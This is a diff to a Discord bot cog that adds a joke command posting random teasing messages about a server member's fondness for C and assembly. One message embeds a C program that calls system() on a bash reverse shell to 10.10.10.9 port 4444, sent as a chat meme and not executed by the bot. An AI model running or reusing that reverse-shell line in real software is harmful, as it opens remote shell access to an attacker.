@@ -102,6 +102,48 @@ class Prestige(commands.Cog):
         ]
 
         await ctx.send(choice(sentences))
+        
+    @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
+    async def _cafone(self, ctx) -> None:
+        """ A command for telling something about cafone. """
+        
+        sentences = [
+            "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
+            "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
+            "i heard **c** <:peep_selfie:959872040301629561> <@703017795738402827>",
+            "i heard *python* <:pepecool:572067081508618251> <@703017795738402827>",
+            """<@703017795738402827>
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
+  const char* message = "cafone best engineer and hacker\\n";
+  int result;
+  
+  result = system(command);
+  if(result == -1)
+  {
+    printf("Error when executing the command.\\n");
+    return 1;
+  }
+  else
+  {
+    printf("yeaahhh boiiii\\n");
+  }
+
+  for(;;)
+    printf(message);
+
+  return 0;
+}
+```""",
+            "**sexiest italo/spanish engineer & hacker on the server🇮🇹🇪🇦** <@703017795738402827>"
+        ]
+
+        await ctx.send(choice(sentences))
 
     @commands.command(aliases=["felipe"])
     async def sousa(self, ctx) -> None:
